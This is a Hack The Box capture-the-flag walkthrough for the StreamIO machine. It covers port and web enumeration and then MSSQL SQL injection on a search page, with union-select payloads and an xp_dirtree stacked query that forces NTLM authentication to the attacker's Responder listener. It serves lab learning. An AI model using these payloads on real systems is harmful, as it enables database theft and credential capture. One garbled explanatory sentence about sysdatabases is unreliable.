---
description: https://app.hackthebox.com/machines/474
---

# ▶️ StreamIO

<figure><img src="../../../.gitbook/assets/image (645).png" alt=""><figcaption><p>Starting to get high level</p></figcaption></figure>

First we start by going through all the ports open without being to verbose:

```
nmap -p- --min-rate 10000 10.129.77.104
```

then we do a verbose scan for the open ports:

```
nmap -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389 -sCV 10.129.77.104
```

<figure><img src="../../../.gitbook/assets/image (646).png" alt=""><figcaption></figcaption></figure>

Based on the [IIS Version](https://en.wikipedia.org/wiki/Internet\_Information\_Services#Versions) on 80, the host is likely running Windows 10+ or Server 2016+.

The combination of services (DNS 53, Kerberos 88, LDAP 389 and others, SMB 445, RPC 135, Netbios 139, and others) suggests this is a domain controller.

On port 443 we can see 2 DNS to put in our /etc/hosts: `streamIO.htb` and `watch.streamIO.htb`

After a fuzz on 80 and 443, we only found the watch. DNS, we can go and enumerate SMB (445) now

{% embed url="https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/" %}

```
crackmapexec smb 10.129.77.104
```

<figure><img src="../../../.gitbook/assets/image (647).png" alt=""><figcaption></figcaption></figure>

So now we can add `DC.streamIO.htb` to the hosts folder&#x20;

anonymous login did not work on the SMB shares, so let's start looking at the websites:

port 80 is just a IIS page, on the other hand the streamIO.htb on port 443 (HTTPS) is interesting:

<figure><img src="../../../.gitbook/assets/image (648).png" alt=""><figcaption></figcaption></figure>

on the about page:&#x20;

<figure><img src="../../../.gitbook/assets/image (649).png" alt=""><figcaption></figcaption></figure>

Maybe some possible users?

we see some subdomains that end with php, maybe it's the way to go for feroxbuster?

```
feroxbuster -u streamIO.htb -x php -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k
```

<figure><img src="../../../.gitbook/assets/image (650).png" alt=""><figcaption></figcaption></figure>

we get some pretty interesting domains

<figure><img src="../../../.gitbook/assets/image (651).png" alt=""><figcaption></figcaption></figure>

that's quite interesting&#x20;

so let's go on our login page that has a little register button under it:

<figure><img src="../../../.gitbook/assets/image (652).png" alt=""><figcaption></figcaption></figure>

Let's register -> Felix/Felix

even after register, I can't connect?

<figure><img src="../../../.gitbook/assets/image (653).png" alt=""><figcaption></figcaption></figure>

let's pivot to their other plateform watch.

<figure><img src="../../../.gitbook/assets/image (654).png" alt=""><figcaption></figcaption></figure>

Note that every domain in HTTP redirects to IIS and HTTPS to the interesting domain :interrobang:

i subscribed with a test@test.com and got this response:&#x20;

<figure><img src="../../../.gitbook/assets/image (655).png" alt=""><figcaption></figcaption></figure>

Let's try to see some subdomains for this one:

```
feroxbuster -u https://watch.streamio.htb -x php -w
```

the only subdomain that seemed interesting was the blocked.php:

<figure><img src="../../../.gitbook/assets/image (656).png" alt=""><figcaption></figcaption></figure>

Aye, we have got to be extra precocious&#x20;

after a second look, the search.php was interesting:

<figure><img src="../../../.gitbook/assets/image (657).png" alt=""><figcaption></figcaption></figure>

all the watch buttons are popping this up:&#x20;

<figure><img src="../../../.gitbook/assets/image (658).png" alt=""><figcaption></figcaption></figure>

Let's see if we can get some stuff out of this:

<figure><img src="../../../.gitbook/assets/image (659).png" alt=""><figcaption></figcaption></figure>

so it's clearly using wildcards or some sort like `*the*`

So the query could look something like:

```
select * from movies where title like '%the%';
```

so if in the input i do something like `the';-- -`

<figure><img src="../../../.gitbook/assets/image (638).png" alt=""><figcaption></figcaption></figure>

yeah just as i thought it returns every movie that ENDS with the because now the query looke like `%the`

playing with the input, we can easily find the query to print all:

<figure><img src="../../../.gitbook/assets/image (639).png" alt=""><figcaption></figcaption></figure>

now let's use the column tricks I learned in the sql documentation:

{% content-ref url="../../cybersecurity-documentation/web-application/sql-injection.md" %}
[sql-injection.md](../../cybersecurity-documentation/web-application/sql-injection.md)
{% endcontent-ref %}

damn first try :joy:

```
snatch' union select null#
```

<figure><img src="../../../.gitbook/assets/image (640).png" alt=""><figcaption></figcaption></figure>

Ok so after waiting for 1h i was not really blocked, after looking for a session id or whatever could block me i was just redirected to the blocked.php page so the input is probably case sensitive ->

this does not redirect me:&#x20;

```
snatch' union 1;-- -
```

<figure><img src="../../../.gitbook/assets/image (641).png" alt=""><figcaption></figcaption></figure>

after troubleshooting, some typo does not return anything that is very wierd:

```
abcd' union select 1,2,3,4,5,6;-- -
```

<figure><img src="../../../.gitbook/assets/image (642).png" alt=""><figcaption></figcaption></figure>

`abcd' union select 1,2,3,4,5,6;-- -` is used to inject a new query into a legitimate SQL query and extract data from the database. The `union` keyword is used to join the results of the original query and the injected query, and the `select` statement is used to specify the values to be returned. The `;` character is used to terminate the query, and the `--` and `-` characters are used to start and complete a comment.

***

I’ll try to get the DB version. [This cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet#database-version) shows how with different database types. It’s fair to guess that this is either MSSQL (since it’s Windows) or MySQL (very common with PHP). Both of those use `@@version`, and it works:

<figure><img src="https://0xdfimages.gitlab.io/img/image-20220912160305018.png" alt=""><figcaption></figcaption></figure>

lets try stacked queries to get a Net-NTLMv2 hash

{% embed url="https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html" %}

after setting up responder ->

```
responder -I tun0 -wrf
```

and input:

```
abcd'; use master; exec xp_dirtree '\\10.10.14.166\share';-- -
```

we get some form of response:

<figure><img src="../../../.gitbook/assets/image (643).png" alt=""><figcaption></figcaption></figure>

Unfortunately hash cat won't crack because it's a machine account so unlikely to be crackable ->

```
abcd'union select 1,name,3,4,5,6 from master..sysdatabases;-- -
```

* `union select 1,name,3,4,5,6` is the second query that is being injected. The `select` keyword is used to specify the columns to be returned. In this case, selecting the values `1`, `name`, `3`, `4`, `5`, and `6`. The `name` column is being selected from the `master..sysdatabases` table.
* `from master..sysdatabases` specifies the table from which the data is being selected. The `master` database contains system information about instance, and the `ases` table contains information about all on the.

{% embed url="https://learn.microsoft.com/fr-fr/sql/relational-databases/system-catalog-views/sys-databases-transact-sql?view=sql-server-ver16" %}

The purpose of this query is to extract the names of all databases on the server. The `union` keyword is used to combine the results of the original query with the results injected query. By selecting the `name` column from the `sysdatabases` table, the attacker can extract databases on the server. The values `1`, `3`, `4`, `5`, and `6` are used to ensure that the number of columns in the two queries match, which is required for the `union` keyword to work properly.

<figure><img src="../../../.gitbook/assets/image (644).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://learn.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver16" %}

we can see in this doc that all the DB's are system DB's, our DB is `STREAMIO`
